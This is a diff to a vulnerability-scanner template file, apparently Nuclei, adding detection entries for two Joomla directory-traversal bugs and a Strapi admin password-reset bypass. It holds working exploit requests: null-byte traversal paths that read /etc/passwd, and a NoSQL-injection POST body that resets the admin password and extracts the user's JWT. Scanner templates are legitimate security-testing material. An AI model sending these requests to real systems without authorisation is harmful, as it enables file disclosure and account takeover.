@@ -979,6 +979,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1312",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the iJoomla News Portal (com_news_portal) component 1.5.x for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component News Portal 1.5.x - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12077",
+          "https://www.cvedetails.com/cve/CVE-2010-1312"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_news_portal&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1313",
       "info": {
         "author": "daffainfo",
@@ -1233,6 +1270,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1473",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Advertising (com_advertising) component 0.25 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Advertising 0.25 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12171",
+          "https://www.cvedetails.com/cve/CVE-2010-1473"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_advertising&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -14048,6 +14122,62 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/getFavicon?host=http://{{interactsh-url}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-18818",
+      "info": {
+        "author": "idealphase",
+        "description": "strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.",
+        "name": "Strapi CMS - Admin password reset (Unauthenticated)",
+        "reference": [
+          "https://github.com/advisories/GHSA-6xc2-mj39-q599",
+          "https://www.exploit-db.com/exploits/50239",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-18818"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2019,strapi,auth-bypass,intrusive"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "json": [
+                ".user.username",
+                ".user.email"
+              ],
+              "type": "json"
+            }
+          ],
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"username\":",
+                "\"email\":",
+                "\"jwt\":"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /admin/auth/reset-password HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/json\n\n{\"code\": {\"$gt\": 0}, \"password\": \"SuperStrongPassword1\", \"passwordConfirmation\": \"SuperStrongPassword1\"}\n"
           ]
         }
       ]
